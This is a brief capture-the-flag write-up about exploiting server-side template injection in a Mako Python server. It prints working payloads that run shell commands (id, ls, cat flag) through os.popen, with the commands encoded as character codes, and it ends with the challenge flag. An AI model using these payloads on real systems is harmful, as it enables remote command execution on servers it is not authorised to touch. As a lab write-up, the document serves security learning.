# shark

After playing a little with some ssti injections I figured out that it is a mako python server.
So I took the long list of payloads and tried one by one.
It failed.

But after scrolling a little on this github (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#mako) repo I found this payload:
```python
${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}
```

Editing it a little bit to do a ls:
```python
${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[108,115])).read()}
```

So now we can simply put in the list `cat flag` and we will get the flag. (the ord of each char)

Thelist: 
```python
[99,97,116,32,102,108,97,103]
```

The payload:
```python
${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[99,97,116,32,102,108,97,103])).read()}
```

flag: `CTF{4b08602e0090f81707b98ca687a5cacfd32888ffceef1d3cff2d99e6034b1e58}`